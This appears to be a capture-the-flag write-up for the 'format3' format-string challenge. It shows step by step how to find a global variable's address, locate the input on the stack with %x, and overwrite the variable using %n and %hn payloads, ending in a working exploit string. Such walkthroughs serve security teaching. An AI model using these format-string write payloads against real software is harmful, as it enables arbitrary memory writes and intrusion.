Using `objdump -t` we can see where is the variable `target` is located.
```bash
objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target
```
So the global variable `target` is located at `080496f4`.

The next step is when encountering format string vulnerbility, it's good to just throw hex format with reasonable amount of format in order to dump the stack, and see where our argument appeared. 
```bash
./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "AAAA" + "%x "*20)') | grep --color=always -e "^" -e "80496f4"
�AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 80496f4 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825
target is 00000000 :(
```

The fact that we see `80496f4` `target` means we’ve successfully located the position in the stack where our input is being placed.

```bash
./format3 <<< $(python -c 'print("\xf4\x96\x04\x08"+ "%x "*12)') | grep --color=always -e "^" -e "80496f4"
�0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 80496f4
target is 00000000 :(


./format3 <<< $(python -c 'print("\xf4\x96\x04\x08"+ "%x "*11)') | grep --color=always -e "^" -e "80496f4"
�0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614
target is 00000000 :(
```

Next we need to make that `80496f4` equal to `0x01025544` or `16930116` in decimal. We can do like:

```bash
./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "%x "*11 + "%21828x%12$n")')
target is 00005590 :(


./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "%x "*11 + "%21752x%12$n")')
target is 00005544 :(
```

```bash
./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21828x%11$hn")')
target is 0000554c :(

./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$hn")')
target is 00005544 :(


./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$hn" + "%258x%13$hn")')
```


Finally the solution:
```bash
./format3 <<< $(python -c 'print("\xf4\x96\x04\x08" + "\xf6\x96\x04\x08" + "%21820x%12$hn" + "%43966x%13$hn")')
you have modified the target :)
```
